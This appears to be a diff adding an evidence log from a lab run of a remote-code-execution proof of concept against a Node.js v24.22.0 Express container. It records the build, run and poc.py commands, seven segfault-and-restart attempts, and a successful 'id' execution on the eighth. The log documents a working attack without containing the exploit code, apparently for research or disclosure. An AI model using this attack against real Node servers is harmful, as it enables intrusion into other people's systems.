@@ -1,0 +1,62 @@
+Node2Shell Lab evidence
+started_at_utc=2026-10-31T14:48:08Z
+lab=ref-express
+kind=rce
+mode=rce
+image=node2shell-lab:ref-24.22.0
+profile=n2s-ref-express-24.22.0-x86_64
+build_command=docker build --pull --platform linux/amd64 -f lab/reference-express/Dockerfile -t node2shell-lab:ref-24.22.0 lab/reference-express
+run_command=docker run -d --name n2s-evidence-ref-express-rce-run1 -p 127.0.0.1:3000:3000 node2shell-lab:ref-24.22.0
+poc_command=python -u poc.py --profile n2s-ref-express-24.22.0-x86_64 --mode rce --timeout 30
+
+image_id=sha256:938786df04f70449d01996f6a84c3de837639ed8970d21ca1055450bfa8526c6
+node_version=v24.22.0
+node_binary=67ca5783febb8bf85736c79fcdd92c8d6d465a0eb2a082672bcdfa76a506751c  /usr/local/bin/node
+
+container_id=cf45d60ff7af06c2faa01ec27022924fb4ac79f225df9696c18b8031e710e5d8
+
+--- POC OUTPUT ---
+attempt=1/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=2/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=3/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=4/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=5/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=6/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=7/16 staged_position=0x137ed748
+fresh_process_reset=network crash trigger
+attempt=8/16 staged_position=0x137ed748
+PASS: RCE verified by fresh id output through the declared interface
+profile=n2s-ref-express-24.22.0-x86_64
+proof_channel=HTTP request socket stdout
+proof_command=id
+proof_stdout=uid=1000(node) gid=1000(node) groups=1000(node)
+successful_attempt=8
+poc_exit=0
+
+--- OPERATOR OBSERVATION (after poc.py exited) ---
+docker_inspect=status=running exit=0 started=2026-10-31T14:48:12.701918637Z finished=0001-01-01T00:00:00Z
+post_attempt_health=PONG
+--- CONTAINER LOG TAIL ---
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+Segmentation fault
+supervisor: node exited, restarting
+supervisor: node exited, restarting
+finished_at_utc=2026-10-31T14:48:34Z
+result=PASS
